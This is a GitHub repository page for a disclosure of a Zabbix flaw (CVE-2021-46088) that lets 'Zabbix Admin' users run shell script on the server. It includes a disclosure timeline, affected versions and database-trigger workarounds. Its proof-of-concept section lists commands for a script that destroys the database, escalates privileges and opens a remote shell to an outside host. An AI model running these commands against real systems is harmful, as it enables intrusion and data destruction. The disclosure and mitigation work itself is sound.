=== Content from github.com_405ccab3_20250114_223812.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpaalbra%2Fzabbix-zbxsec-7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpaalbra%2Fzabbix-zbxsec-7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=paalbra%2Fzabbix-zbxsec-7)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[paalbra](/paalbra)
/
**[zabbix-zbxsec-7](/paalbra/zabbix-zbxsec-7)**
Public

* [Notifications](/login?return_to=%2Fpaalbra%2Fzabbix-zbxsec-7) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fpaalbra%2Fzabbix-zbxsec-7)
* [Star
   3](/login?return_to=%2Fpaalbra%2Fzabbix-zbxsec-7)

[3
stars](/paalbra/zabbix-zbxsec-7/stargazers) [2
forks](/paalbra/zabbix-zbxsec-7/forks) [Branches](/paalbra/zabbix-zbxsec-7/branches) [Tags](/paalbra/zabbix-zbxsec-7/tags) [Activity](/paalbra/zabbix-zbxsec-7/activity)
 [Star](/login?return_to=%2Fpaalbra%2Fzabbix-zbxsec-7)

 [Notifications](/login?return_to=%2Fpaalbra%2Fzabbix-zbxsec-7) You must be signed in to change notification settings

* [Code](/paalbra/zabbix-zbxsec-7)
* [Issues
  0](/paalbra/zabbix-zbxsec-7/issues)
* [Pull requests
  0](/paalbra/zabbix-zbxsec-7/pulls)
* [Actions](/paalbra/zabbix-zbxsec-7/actions)
* [Projects
  0](/paalbra/zabbix-zbxsec-7/projects)
* [Security](/paalbra/zabbix-zbxsec-7/security)
* [Insights](/paalbra/zabbix-zbxsec-7/pulse)

Additional navigation options

* [Code](/paalbra/zabbix-zbxsec-7)
* [Issues](/paalbra/zabbix-zbxsec-7/issues)
* [Pull requests](/paalbra/zabbix-zbxsec-7/pulls)
* [Actions](/paalbra/zabbix-zbxsec-7/actions)
* [Projects](/paalbra/zabbix-zbxsec-7/projects)
* [Security](/paalbra/zabbix-zbxsec-7/security)
* [Insights](/paalbra/zabbix-zbxsec-7/pulse)

# paalbra/zabbix-zbxsec-7

    master[Branches](/paalbra/zabbix-zbxsec-7/branches)[Tags](/paalbra/zabbix-zbxsec-7/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[51 Commits](/paalbra/zabbix-zbxsec-7/commits/master/) | | |
| [zabbix-simple @ c81290d](/paalbra/zabbix-simple/tree/c81290d613ee1588cd95082173d15e26ba478065 "zabbix-simple") | | [zabbix-simple @ c81290d](/paalbra/zabbix-simple/tree/c81290d613ee1588cd95082173d15e26ba478065 "zabbix-simple") |  |  |
| [.gitmodules](/paalbra/zabbix-zbxsec-7/blob/master/.gitmodules ".gitmodules") | | [.gitmodules](/paalbra/zabbix-zbxsec-7/blob/master/.gitmodules ".gitmodules") |  |  |
| [README.md](/paalbra/zabbix-zbxsec-7/blob/master/README.md "README.md") | | [README.md](/paalbra/zabbix-zbxsec-7/blob/master/README.md "README.md") |  |  |
| [evil.py](/paalbra/zabbix-zbxsec-7/blob/master/evil.py "evil.py") | | [evil.py](/paalbra/zabbix-zbxsec-7/blob/master/evil.py "evil.py") |  |  |
| View all files | | |

## Repository files navigation

* README
# Zbxsec-7

## About

This repository contains a proof-of-concept of a security issue in [Zabbix](https://zabbix.com).

Any user with the "Zabbix Admin" role is able to run custom shell script on the application server in the context of the application user. The impact of this will vary, depending on OS, Zabbix version and how/which users are granted the "Zabbix Admin" role, but the users will probably have full database access and access to other secrets stored on the application server.

The issue is a "feature" that gives the "Zabbix Admin" role the ability to create actions that use remote commands and custom script. This custom script is run on the application server.

Links:

* <https://www.zabbix.com/documentation/5.0/manual/web_interface/frontend_sections/configuration/actions>
* <https://www.zabbix.com/documentation/5.0/manual/config/notifications/action/operation/remote_command>

Short history:

* The issue was reported to security@zabbix.com on July 30th, 2019 (4.2 was the newest version at this point).
* It was registered as <https://support.zabbix.com/browse/ZBXSEC-7> on August 23rd, 2019.
* On Desember 10th, 2020, the Zabbix team was informed that after 90 days the issue could be posted publicly.
* The registered issue has had little activity. It was closed (and resolution set as "fixed") on Jan 29th, 2021.
* On Jan 27th, 2022, this was given CVE-ID [CVE-2021-46088](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-46088).
* The issue has not been resolved.

The issue is confirmed present in the following versions of Zabbix:

* 4.0 LTS
* 4.2
* 4.4
* 5.0 LTS

In 5.4 they've [changed the way scripts are managed](https://www.zabbix.com/documentation/5.4/en/manual/installation/upgrade_notes_540#central-location-for-scripts). You need to be granted access to the Administration->Scripts UI element. The normal Admin role does not have this access out of the box after 5.4. You may however create roles with this access and should be aware of the implication. The Super Admin role still has the ability to create custom scripts out of the box, and has the ability to damage the application-server.

This issue was just seen as "misconfiguration" by the Zabbix team, even though PoC is able to quite easily destroy the application in their own container images.

## Zabbix test instance

A test instance of Zabbix could be created with the "zabbix-simple" git submodule. It uses [podman](https://podman.io/getting-started/) and the [container images from zabbix](https://hub.docker.com/u/zabbix).

You should clone this repository with the `--recurse-submodules` argument or use `git submodule update --init` after a simple clone.

Follow the instructions in `./zabbix-simple/README.md`.

## Proof-of-concept

If you set up an instance with "zabbix-simple" you should have installed [pyzabbix](https://pypi.org/project/pyzabbix/), a user called "User" with the role "Zabbix Admin". The password of this user is the default password "zabbix".

Destroy database:

```
python evil.py --activate http://127.0.0.1:8080 User zabbix destroy-database

```

Escalation:

```
python evil.py --activate http://127.0.0.1:8080 User zabbix escalation User

```

Remote shell connecting to myhost.example.com:8000:

```
python evil.py --activate http://127.0.0.1:8080 User zabbix remote-shell myhost.example.com 8000

```

The trigger might need a few seconds/minutes to activate.

## Workaround

The only workaround I am aware of is through database triggers that prevent you from adding custom scripts.

### Postgres

```
CREATE FUNCTION raise_exception() RETURNS trigger AS $$
  DECLARE
    message TEXT;
  BEGIN
    message := TG_ARGV[0];
    RAISE exception '%', message;
  END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER no_custom_script
BEFORE INSERT OR UPDATE ON opcommand
FOR EACH ROW
WHEN (NEW.type = 0)
EXECUTE FUNCTION raise_exception('No custom script');
```

### MySQL

```
DELIMITER //
CREATE TRIGGER no_custom_script_update
  BEFORE UPDATE ON opcommand
  FOR EACH ROW
BEGIN
  IF (NEW.type = 0) THEN
    SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'No custom script';
  END IF;
END //
CREATE TRIGGER no_custom_script_insert
  BEFORE INSERT ON opcommand
  FOR EACH ROW
BEGIN
  IF (NEW.type = 0) THEN
    SIGNAL SQLSTATE '45000' SET MESSAGE_TEXT = 'No custom script';
  END IF;
END //
DELIMITER ;
```

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/paalbra/zabbix-zbxsec-7/activity)
### Stars

[**3**
stars](/paalbra/zabbix-zbxsec-7/stargazers)
### Watchers

[**3**
watching](/paalbra/zabbix-zbxsec-7/watchers)
### Forks

[**2**
forks](/paalbra/zabbix-zbxsec-7/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fpaalbra%2Fzabbix-zbxsec-7&report=paalbra+%28user%29)

## [Releases](/paalbra/zabbix-zbxsec-7/releases)

No releases published

## [Packages 0](/users/paalbra/packages?repo_name=zabbix-zbxsec-7)

No packages published

## [Contributors 2](/paalbra/zabbix-zbxsec-7/graphs/contributors)

## Languages

* [Python
  100.0%](/paalbra/zabbix-zbxsec-7/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


